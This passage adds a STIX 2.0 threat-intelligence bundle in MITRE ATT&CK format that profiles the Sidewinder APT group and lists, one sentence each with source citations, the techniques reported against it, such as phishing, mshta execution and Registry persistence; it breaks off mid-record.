@@ -1,0 +1,2724 @@
+{
+    "type": "bundle",
+    "id": "bundle--1191884e-8ad3-46a6-864c-e117c1e8548e",
+    "spec_version": "2.0",
+    "objects": [
+        {   "primary_motivation": "organizational-gain",
+            "first_seen":"2012",
+            "dest-x_MISP-uuid": "3c43bd4c-8c40-47b5-ae97-3dd0f0c0e8d8",
+            "x_MISP-uuid": "c4ce1174-9462-47e9-8038-794f40a184b3",
+            "type": "intrusion-set",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "name": "Sidewinder",
+            "x_mitre_version": "1.0",
+            "modified": "2022-06-11T20:10:32.917Z",
+            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
+            "aliases": [
+                "Sidewinder",
+                "T-APT-04",
+                "Rattlesnake",
+                "APT-C-17"
+            ],
+            "id": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020)",
+            "x_mitre_contributors": [
+                "Lacework Labs",
+                "Daniyal Naeem, BT Security"
+            ],
+            "created": "2021-01-27T15:57:11.183Z",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/groups/G0121",
+                    "external_id": "G0121",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "description": "(Citation: Cyble Sidewinder September 2020)",
+                    "source_name": "T-APT-04"
+                },
+                {
+                    "description": "(Citation: Cyble Sidewinder September 2020)",
+                    "source_name": "Rattlesnake"
+                },
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://securelist.com/apt-trends-report-q1-2018/85280/",
+                    "description": "Global Research and Analysis Team . (2018, April 12). APT Trends report Q1 2018. Retrieved January 27, 2021.",
+                    "source_name": "Securelist APT Trends April 2018"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--fc43ba07-ffa2-4617-95ac-7ff6462eccd0",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to identify the user of a compromised host.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
+            "modified": "2021-04-06T22:07:34.194Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:35:54.447Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--0cf2ae01-9d19-46d7-949e-e6d7a5639a95",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used the Windows service <code>winmgmts:\\\\.\\root\\SecurityCenter2</code> to check installed antivirus products.(Citation: Rewterz Sidewinder APT April 2020)",
+            "target_ref": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
+            "modified": "2021-07-21T12:24:09.285Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-29T20:02:21.777Z",
+            "external_references": [
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--0ecbbfa3-6b81-4cf7-9033-373ebbc2832f",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used <code>mshta.exe</code> to execute malicious payloads.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+            "modified": "2021-07-21T12:24:09.229Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-29T19:16:42.231Z",
+            "external_references": [
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--1bf421b0-1faf-403d-a8c6-3f5eb90d7c9d",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has collected stolen files in a temporary folder in preparation for exfiltration.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+            "modified": "2021-04-06T22:07:34.270Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:47:55.487Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--1e9f6719-24c5-4c8b-a832-506f46bbadb6",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to identify running processes on the victim's machine.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
+            "modified": "2021-04-06T22:07:34.268Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:40:53.409Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--3d2736f6-5ce8-48ba-8be0-e8d8ab0a3a9c",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has configured tools to automatically send collected files to attacker controlled servers.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
+            "modified": "2021-04-06T22:07:34.550Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:58:09.562Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--5d43c968-d9d2-4687-949e-23888376f10c",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has added paths to executables in the Registry to establish persistence.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
+            "modified": "2021-07-21T12:24:09.191Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-29T19:04:19.978Z",
+            "external_references": [
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--6cce15df-4e0c-4eac-b597-5a301d450546",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used malware to collect information on files and directories.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
+            "modified": "2021-04-08T17:35:16.087Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:47:55.496Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--9eb64003-16d8-4b2d-b5e5-206130e5dd17",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used malware to collect information on network interfaces, including the MAC address.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
+            "modified": "2021-04-07T15:19:28.762Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:42:43.446Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--10cf6efc-6415-4a80-834a-565057e76474",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to obtain the current system time.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
+            "modified": "2021-04-06T22:07:34.253Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:40:53.412Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--32e947a4-cbd3-45a8-ae74-7e51edf84d81",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used base64 encoding and ECDH-P256 encryption for scripts and files.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
+            "modified": "2021-08-30T23:07:29.020Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:56:45.177Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--60be159a-b083-48c2-bd38-4abb873d1f30",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used HTTP in C2 communications.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
+            "modified": "2021-07-21T12:13:30.253Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:58:09.536Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--107dc621-6f5d-4b59-9873-54355e55312d",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has sent e-mails with malicious links to credential harvesting websites.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
+            "modified": "2021-04-06T22:07:33.848Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:43:48.377Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--118e5be5-a143-4e2f-b80f-20b580f14210",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has sent e-mails with malicious links often crafted for specific targets.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
+            "modified": "2021-04-06T22:07:33.919Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:43:48.402Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--326d0ed6-35a6-452e-a8a2-ab2a7e034faa",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used JavaScript to drop and execute malware loaders.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
+            "modified": "2021-04-21T12:32:47.110Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:35:33.518Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--400ed882-80e9-47f7-85a6-11996fbbb635",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used LNK files to download remote files to the victim's network.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+            "modified": "2021-04-07T15:19:28.823Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:57:05.361Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--0841fe7b-657e-47e9-b4c9-ec812043a41c",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.(Citation: ATT Sidewinder January 2021)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
+            "modified": "2021-04-06T22:07:34.076Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:57:05.393Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--67583965-9e89-49cd-bdac-9fd69d7857ae",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
+            "target_ref": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
+            "modified": "2021-07-21T12:24:09.264Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-29T19:58:04.356Z",
+            "external_references": [
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19",
+                    "description": "Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder COVID-19 June 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--a28e6ec8-0519-40e7-b252-90205dfbe5d9",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has sent e-mails with malicious attachments that lead victims to credential harvesting websites.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Cyble Sidewinder September 2020)",
+            "target_ref": "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc",
+            "modified": "2021-08-30T23:07:28.928Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T16:43:48.380Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
+                    "description": "Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021.",
+                    "source_name": "Rewterz Sidewinder APT April 2020"
+                },
+                {
+                    "url": "https://cybleinc.com/2020/09/26/sidewinder-apt-targets-with-futuristic-tactics-and-techniques/",
+                    "description": "Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021.",
+                    "source_name": "Cyble Sidewinder September 2020"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--a55c163c-3eb8-47a2-8ad1-3a667b4ac129",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used PowerShell to drop and execute malware loaders.(Citation: ATT Sidewinder January 2021)",
+            "target_ref": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
+            "modified": "2021-04-21T12:32:47.132Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-27T20:35:33.506Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "relationship",
+            "id": "relationship--ab058a49-a8fc-403d-ae97-9137625c82d7",
+            "description": "[Sidewinder](https://attack.mitre.org/groups/G0121) has used tools to enumerate software installed on an infected host.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)",
+            "target_ref": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
+            "modified": "2021-07-21T12:24:09.144Z",
+            "source_ref": "intrusion-set--3fc023b2-c5cc-481d-9c3e-70141ae1a87e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "relationship_type": "uses",
+            "created": "2021-01-28T15:55:35.335Z",
+            "external_references": [
+                {
+                    "url": "https://cdn-cybersecurity.att.com/docs/global-perspective-of-the-sidewinder-apt.pdf",
+                    "description": "Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021.",
+                    "source_name": "ATT Sidewinder January 2021"
+                },
+                {
+                    "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis",
